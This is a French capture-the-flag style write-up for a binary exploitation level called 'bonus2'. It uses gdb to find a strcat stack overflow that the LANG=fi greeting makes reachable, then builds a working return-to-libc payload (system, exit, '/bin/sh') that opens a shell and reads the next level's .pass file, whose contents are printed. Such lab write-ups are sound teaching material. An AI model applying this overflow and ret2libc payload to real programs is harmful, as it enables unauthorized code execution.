@@ -1,0 +1,111 @@
+En testant et analysant le code dans gdb (/Ressources/asm), on comprends que le programme prend deux arguments, 
+On comprend que Dans le main, on check la valeur de la variable d'environnement LANG, si elle est égale à fi, on passe la variable globale language à 1, si elle est égale à nl, on passe la variable à 2.
+On observe aussi deux strncpy.
+Les deux strncpy permettent de copier les 40 premier octets du premier argument, et d'ensuite copier 32 octets du second arguments, et ça directement à la suite de la première copie (juste après là où on a copié les 40 octet du premier arg)
+Cela fait un ensemble de 72 octets si on rempli les 2 strncpy, que l'on va passer à la function greetuser.
+Cette fonction greetuser regarde la valeur de la variable d'environnement, et va concatener un <bonjour> soit en anglais, soit en finlandais, soit en néerlandais (selon la valeur de la variable language) avec le buffer de 72 octets.
+
+Or il se trouve que la string <bonjour> et la première string vers laquelle on va concatener. donc le début de cette string et le début de là où on va ensuite ajouter notre buffer, qui peut éventuellement déborder.
+Or ce premier mot se situe à ebp-0x48, c'est à dire ebp-72. Cela signifie qu'il y a la place pour 72 octets dans le strcat avant de override ebp.
+or notre buffer peut déjà accueillir 72 octets. Si on concatene au <bonjour> cela dépassera forcement sur l'ebp, et même plus.
+Voyons ce qui se trouve au dela de ebp:
+
+(gdb) b *0x08048517 (au niveau du strcat)
+(gdb) run AAAABBBBCCCCDDDDEEEEFFFFFGGGGHHHHJJJJKKKKLLLLMMMM aaaabbbbccccddddeeeeffffgggghhhhiiiikkkkllll
+(gdb) x/30wx $ebp-0x48    (addresse de là ou démarre la concaténation (addresse de la première chaine de caractèere, qui comprend le <Bonjour>))
+0xbffff5d0:	0x6c6c6548	0x0800206f	0x0000414c	0xb7e5e281
+0xbffff5e0:	0xbfffff26	0xb7e338f8	0x00000002	0xb7ec38ee
+0xbffff5f0:	0xbffff628	0xbffff670	0x00000000	0xbffff6bc
+0xbffff600:	0xbffff6d8	0xb7ff26b0	0xbfffff26	0xb7f5d780
+0xbffff610:	0xbfffff29	0xb7fff918	0xbffff6d8	-0x08048630-
+0xbffff620:	0x41414141	0x42424242	0x43434343	0x44444444
+0xbffff630:	0x45454545	0x46464646	0x47474746	0x48484847
+0xbffff640:	0x4a4a4a48	0x4b4b4b4a
+
+On voit que juste après l'addresse de ebp(0xbffff6d8) se trouve une addresse qui renvoie vers le main(+263) 0x08048630. Il est donc évident que le code repassera par cette addresse. D'ailleurs si on continue le programme, on aura un segfault:
+(gdb) continue
+Continuing.
+Hello AAAABBBBCCCCDDDDEEEEFFFFFGGGGHHHHJJJJKKKaaaabbbbccccddddeeeeffffgggghhhh
+Program received signal SIGSEGV, Segmentation fault.
+0x08006868 in ?? ()
+(gdb) info registers
+eax            0x4f	79
+ecx            0xffffffff	-1
+edx            0xb7fd28b8	-1208145736
+ebx            0xbffff670	-1073744272
+esp            0xbffff620	0xbffff620
+ebp            0x68686767	0x68686767
+esi            0xbffff6bc	-1073744196
+edi            0xbffff66c	-1073744276
+eip            0x8006868	0x8006868
+
+On sait donc maintenant qu'il faut parvenir à faire déborder le strcat jusqu'à l'addresse 0x08048630 (située 76 octets après le début de notre buffer contenant <bonjour>)
+On voit ici que l'EIP est override avec seullement deux octets. Et c'est normal puisque le début de la concaténation est "Hello ", c'est à dire 6 octets. Comme notre buffer contient 72 octets, on atteint un total de 78 octets. 
+L'addresse 0x08048630 est donc override mais que sur deux octets (il se trouve à buffer + 76, et avec "Hello " + 72 on atteint 78 octets)
+Comme on ne peux introduire que 72 octets dans notre buffer que l'on va ensuite passer au strcat, il va faloir jouer avec la premiere string de concaténation:
+
+On a besoin de 12 octets pour pouvoir réaliser un return to libc.
+Le début de notre overide sera à 76 octets après le début de notre buffer. 
+Notre deuxièeme string peut déjà atteindre 72 octets. il en manque encore 4 pour commencer l'override, et ensuite 12 autre pour faire un return to libc, 12 + 4 = 16.
+La langue que nous devons choisir doit permettre d'ajouter donc un minimum de 16 octets à notre concaténation.
+
+Essayons avec l'ensemble des langues:
+"Hello " -> 6 octets. : on ne pourra pas recouvrir entièrement notre addresse à override, et encore moins faire un ret to libc
+"Goedemiddag! " -> 13 octets, on a assez d'octet pour override notre addresse qui se trouve à 76 octets après le début du buffer de strcat, mais pas assez pour pouvoir passer un argument et donc pas assez pour un ret to libc.
+"Hyvää päivää " -> 13 octets, même chose que pour nl, mais en regardant dans gdb on oberve une chose :
+
+(gdb)set environment LANG=fi
+(gdb) b *0x08048517 (au niveau du strcat)
+(gdb) run AAAABBBBCCCCDDDDEEEEFFFFFGGGGHHHHJJJJKKKKLLLLMMMM aaaabbbbccccddddeeeeffffgggghhhhiiiikkkkllll
+(gdb) x/30wx $ebp-0x48    (addresse de là ou démarre la concaténation (addresse de la première chaine de caractèere, qui comprend le <Bonjour>))
+0xbffff5d0:	0xc3767948	0x20a4c3a4	0x69a4c370	0xc3a4c376
+0xbffff5e0:	0xbf0020a4|	0xb7e338f8	0x00000002	0xb7ec38ee
+0xbffff5f0:	0xbffff628	0xbffff670	0x00000000	0xbffff6bc
+0xbffff600:	0xbffff6d8	0xb7ff26b0	0xbfffff2f	0xb7f5d780
+0xbffff610:	0xbfffff32	0xb7fff918	0xbffff6d8	0x08048630
+0xbffff620:	0x41414141	0x42424242	0x43434343	0x44444444
+0xbffff630:	0x45454545	0x46464646	0x47474746	0x48484847
+0xbffff640:	0x4a4a4a48	0x4b4b4b4a
+(gdb) x/s 0xbffff5d4
+0xbffff5d4:	 "\244ä päivää "
+(gdb) x/s 0xbffff5d8
+0xbffff5d8:	 "päivää "
+(gdb) x/s 0xbffff5d5
+0xbffff5d5:	 "ä päivää "
+(gdb) x/s 0xbffff5d6
+0xbffff5d6:	 "\244 päivää "
+
+Les trëma des a prennent un octets ! et il y en a 5: 
+"Hyvää päivää " -> 13 + 5 = 18. On a 18 octets qui vont déborder, d'abord sur ebp, puis sur l'EIP. Il nous faut 12 octets à partir du débordement de l'eip. deborder sur ebp prendra 4 octets, 18 - 4, il reste toujours 14 octets de libre pour faire notre ret to libc.
+Il nous suffit de remplacer l'addresse 0x08048630 par l'addresse d'une fonction system,
+puis ajouter l'addresse vers laquelle on veut aller après l'appelle de system() (on mettra soit 4 octets poubelle, soit l'addresse de exit pour faire ça proprement),
+et enfin l'argument que prendra la function system, on l'occurance /bin/sh.
+
+Donc on va opérer un retrun to libc en utilisant la variable d'environnement LANG=fi
+
+on cherche l'addresse de notre fonction system:
+(gdb) b main
+Breakpoint 1 at 0x804852f
+(gdb) run AAAA BBBB
+Starting program: /home/user/bonus2/bonus2 AAAA BBBB
+Breakpoint 1, 0x0804852f in main ()
+(gdb) p system
+$1 = {<text variable, no debug info>} 0xb7e6b060 <system>
+
+Ensuite on cherche l'addresse exit:
+(gdb) p exit
+$2 = {<text variable, no debug info>} 0xb7e5ebe0 <exit>
+
+Enfin on cherche l'addresse de l'argument /bin/sh
+(gdb) find 0xb7e2c000, 0xb8000000, "/bin/sh"
+0xb7f8cc58
+
+
+On peut maintenant réaliser notre exploit:
+$ LANG=fi ./bonus2 $(python -c 'print 40 * "A"') $(python -c 'print 18 * "A" + "\xb7\xe6\xb0\x60"[::-1] + "\xb7\xe5\xeb\xe0"[::-1] + "\xb7\xf8\xcc\x58"[::-1]')
+|-> choix de la lang  |-> rempli entièrement 1er strncpy    |-> le "Hyvää päivää " prend 18 octet, ensuite 40 octets du premier strncpy, on est à 58, on fait plus 18 pour arriver directement sur l'EIP à 76, puis on met nos 3 addresses.
+Hyvää päivää AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`�����X���
+$ cat /home/user/bonus3/.pass
+71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
+
+
